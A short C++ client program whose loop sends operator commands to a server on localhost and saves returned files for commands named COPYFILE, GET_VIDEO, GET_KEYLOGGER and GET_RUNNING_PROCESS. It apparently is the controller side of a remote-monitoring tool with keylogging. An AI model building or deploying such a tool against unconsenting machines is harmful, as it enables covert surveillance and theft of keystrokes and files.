#include "client.h"
#include "sstream"
int main() {
  Client client;
  client.Init("localhost", "27015");

  while (true) {
    client.GetCommand();
    if (client.command == "EXIT")
      break;
    client.SendCommand();
    std::stringstream ss(client.command);
    std::string com, body;
    ss >> com >> body;
    if (com == "COPYFILE") {
      client.ReceiveFile("../data/copyfile");
    } else if (com == "GET_VIDEO") {
      client.ReceiveFile("../data/video");
    } else if (com == "GET_KEYLOGGER") {
      client.ReceiveFile("../data/keylogger");
    } else if (com == "GET_RUNNING_PROCESS") {
      client.ReceiveFile("../data/process");
    }
  }

  client.Shutdown();
  return 0;
}
